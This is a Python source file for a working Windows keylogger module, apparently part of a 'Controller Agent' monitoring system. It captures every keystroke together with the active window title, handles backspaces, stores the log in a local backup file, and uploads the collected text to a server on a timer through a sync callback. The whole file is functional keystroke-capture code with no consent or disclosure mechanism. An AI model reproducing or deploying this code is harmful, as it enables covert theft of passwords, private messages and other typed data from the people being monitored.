"""
Keylogger module for the Controller Agent.
Migrated from the original standalone keylogger with server sync integration.

Features:
- Captures keystrokes with window context
- Proper backspace handling (removes from buffer or file)
- Periodic sync to server
- Respects policy engine enable/disable
- Local backup file for offline operation
"""

import ctypes
import logging
import os
import threading
import time
from datetime import datetime
from typing import Callable, List, Optional

from pynput import keyboard
from pynput.keyboard import Key, Listener

logger = logging.getLogger(__name__)


class KeyLogger:
    """
    Keylogger with server sync and local file backup.
    
    Features:
    - Captures keystrokes with window context
    - Proper backspace handling (removes characters)
    - Periodic sync to server
    - Respects policy engine enable/disable
    - Local file backup for offline operation
    """
    
    def __init__(
        self, 
        sync_callback: Callable[[str, datetime, datetime, int, int], None] = None,
        sync_interval: int = 300,
        buffer_size: int = 50,
        local_log_file: str = None
    ):
        self.sync_callback = sync_callback
        self.sync_interval = sync_interval
        self.buffer_size = buffer_size
        
        # Local backup file
        if local_log_file is None:
            base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            data_dir = os.path.join(base_dir, 'data')
            os.makedirs(data_dir, exist_ok=True)
            local_log_file = os.path.join(data_dir, 'keylog_backup.txt')
        self.local_log_file = local_log_file
        
        self.log_buffer: List[str] = []
        self.active_window = None
        self.window_switches = 0
        self.character_count = 0
        
        self._running = False
        self._listener: Optional[Listener] = None
        self._sync_thread: Optional[threading.Thread] = None
        self._sync_start: Optional[datetime] = None
        self._lock = threading.Lock()
        
        # Windows API for window titles
        self.user32 = ctypes.windll.user32
    
    def get_active_window_title(self) -> str:
        """Get the title of the currently active window."""
        try:
            hwnd = self.user32.GetForegroundWindow()
            if not hwnd:
                return "Unknown Window"
            
            length = self.user32.GetWindowTextLengthW(hwnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            self.user32.GetWindowTextW(hwnd, buf, length + 1)
            return buf.value
        except Exception:
            return "Unknown Window"
    
    def _flush_to_file(self):
        """Write buffer content to local backup file."""
        if not self.log_buffer:
            return
        
        try:
            with open(self.local_log_file, "a", encoding="utf-8") as f:
                f.write("".join(self.log_buffer))
        except Exception as e:
            logger.error(f"Error writing to local log file: {e}")
    
    def _remove_last_char(self):
        """
        Remove the last character from buffer (for backspace handling).
        If buffer is empty, removes from the local file directly.
        """
        with self._lock:
            if self.log_buffer:
                # Pop the last item from buffer
                last = self.log_buffer.pop()
                
                # If it was a multi-char string (like a window header), put back all but last char
                if len(last) > 1:
                    # Don't delete from special keys like [SHIFT] or window headers
                    if last.startswith("[") or last.startswith("\n"):
                        self.log_buffer.append(last)  # Put it back, can't delete from special
                    else:
                        self.log_buffer.append(last[:-1])
                        self.character_count = max(0, self.character_count - 1)
                else:
                    self.character_count = max(0, self.character_count - 1)
            else:
                # Buffer is empty, need to remove from file
                try:
                    if os.path.exists(self.local_log_file):
                        with open(self.local_log_file, "r", encoding="utf-8") as f:
                            content = f.read()
                        
                        if content and not content.endswith("]") and not content.endswith("\n"):
                            # Remove last character (but don't remove from headers/special keys)
                            content = content[:-1]
                            with open(self.local_log_file, "w", encoding="utf-8") as f:
                                f.write(content)
                except Exception as e:
                    logger.error(f"Error removing char from file: {e}")
    
    def _on_press(self, key):
        """Handle key press events."""
        if not self._running:
            return False
        
        try:
            # Track window switches
            current_window = self.get_active_window_title()
            
            with self._lock:
                if current_window != self.active_window:
                    self._flush_to_file()  # Flush previous window's keys to local file
                    self.active_window = current_window
                    self.window_switches += 1
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    self.log_buffer.append(f"\n\n[{timestamp}] [Window: {current_window}]\n")
                
                # Handle key types
                if key == Key.backspace:
                    # Remove last char from buffer if possible
                    pass  # Handled outside lock
                elif key == Key.delete:
                    pass  # Delete key doesn't affect already typed text
                elif hasattr(key, 'char') and key.char:
                    self.log_buffer.append(key.char)
                    self.character_count += 1
                elif key == Key.space:
                    self.log_buffer.append(" ")
                    self.character_count += 1
                elif key == Key.enter:
                    self.log_buffer.append("\n")
                    self.character_count += 1
                elif key == Key.tab:
                    self.log_buffer.append("\t")
                    self.character_count += 1
                elif key in (Key.shift, Key.shift_r, Key.ctrl_l, Key.ctrl_r,
                            Key.alt_l, Key.alt_r, Key.caps_lock, Key.cmd):
                    pass  # Ignore modifier keys
                else:
                    # Log other special keys (arrows, function keys, etc.)
                    key_str = str(key).replace("Key.", "").upper()
                    self.log_buffer.append(f"[{key_str}]")
                
                # Flush to file periodically
                if len(self.log_buffer) >= self.buffer_size:
                    self._flush_to_file()
                    self.log_buffer = []
            
            # Handle backspace outside lock
            if key == Key.backspace:
                self._remove_last_char()
        
        except Exception as e:
            logger.error(f"Key press handler error: {e}")
    
    def _on_release(self, key):
        """Handle key release events."""
        if key == Key.esc and not self._running:
            return False
    
    def _get_buffer_and_file_content(self) -> tuple:
        """Get buffer content and clear, also read from local file."""
        with self._lock:
            # Get buffer content
            buffer_content = "".join(self.log_buffer)
            char_count = self.character_count
            window_switches = self.window_switches
            
            # Reset buffer
            self.log_buffer = []
            self.character_count = 0
            self.window_switches = 0
        
        # Also get content from local file
        file_content = ""
        try:
            if os.path.exists(self.local_log_file):
                with open(self.local_log_file, "r", encoding="utf-8") as f:
                    file_content = f.read()
                # Clear the file after reading
                with open(self.local_log_file, "w", encoding="utf-8") as f:
                    f.write("")
        except Exception as e:
            logger.error(f"Error reading local log file: {e}")
        
        combined = file_content + buffer_content
        return combined, char_count + len(file_content), window_switches
    
    def _sync_to_server(self):
        """Sync accumulated keylogs to server."""
        if not self.sync_callback:
            return
        
        content, char_count, window_switches = self._get_buffer_and_file_content()
        
        if not content.strip():
            return  # Nothing to sync
        
        end_time = datetime.now()
        start_time = self._sync_start or end_time
        
        try:
            self.sync_callback(
                content,
                start_time,
                end_time,
                char_count,
                window_switches
            )
            logger.debug(f"Synced {char_count} chars to server")
        except Exception as e:
            logger.error(f"Keylog sync error: {e}")
            # Put content back in file for retry
            try:
                with open(self.local_log_file, "a", encoding="utf-8") as f:
                    f.write(content)
            except Exception:
                pass
        
        self._sync_start = datetime.now()
    
    def _sync_loop(self):
        """Background sync loop."""
        while self._running:
            try:
                self._sync_to_server()
            except Exception as e:
                logger.error(f"Sync loop error: {e}")
            
            # Sleep in increments for quick shutdown
            elapsed = 0
            while self._running and elapsed < self.sync_interval:
                time.sleep(min(5, self.sync_interval - elapsed))
                elapsed += 5
    
    def start(self):
        """Start the keylogger."""
        if self._running:
            return
        
        self._running = True
        self._sync_start = datetime.now()
        
        # Start keyboard listener
        self._listener = Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )
        self._listener.start()
        
        # Start sync thread
        if self.sync_callback:
            self._sync_thread = threading.Thread(target=self._sync_loop, daemon=True)
            self._sync_thread.start()
        
        logger.info(f"Keylogger started. Local backup: {self.local_log_file}")
    
    def stop(self):
        """Stop the keylogger and sync remaining data."""
        self._running = False
        
        # Flush remaining buffer to file
        with self._lock:
            self._flush_to_file()
        
        # Final sync
        if self.sync_callback:
            try:
                self._sync_to_server()
            except Exception as e:
                logger.error(f"Final sync error: {e}")
        
        # Stop listener
        if self._listener:
            self._listener.stop()
            self._listener = None
        
        # Stop sync thread
        if self._sync_thread:
            self._sync_thread.join(timeout=5)
            self._sync_thread = None
        
        logger.info("Keylogger stopped")
    
    def is_running(self) -> bool:
        """Check if keylogger is active."""
        return self._running
    
    def update_sync_interval(self, interval: int):
        """Update the sync interval."""
        self.sync_interval = interval
    
    def force_sync(self):
        """Force immediate sync to server."""
        if self.sync_callback:
            self._sync_to_server()


# Singleton instance
_keylogger: Optional[KeyLogger] = None


def get_keylogger() -> Optional[KeyLogger]:
    """Get the keylogger instance."""
    return _keylogger


def init_keylogger(
    sync_callback: Callable = None,
    sync_interval: int = 300,
    local_log_file: str = None
) -> KeyLogger:
    """Initialize the keylogger singleton."""
    global _keylogger
    _keylogger = KeyLogger(
        sync_callback=sync_callback,
        sync_interval=sync_interval,
        local_log_file=local_log_file
    )
    return _keylogger


# Standalone run support (for testing)
if __name__ == "__main__":
    import sys
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    def test_sync(data, start, end, chars, switches):
        print(f"\n[SYNC] {chars} chars, {switches} window switches")
        print(f"Data: {data[:100]}..." if len(data) > 100 else f"Data: {data}")
    
    print("Starting keylogger test... Press ESC to stop.")
    
    kl = KeyLogger(
        sync_callback=test_sync,
        sync_interval=30,
        buffer_size=20
    )
    
    try:
        kl.start()
        while kl.is_running():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping...")
    finally:
        kl.stop()
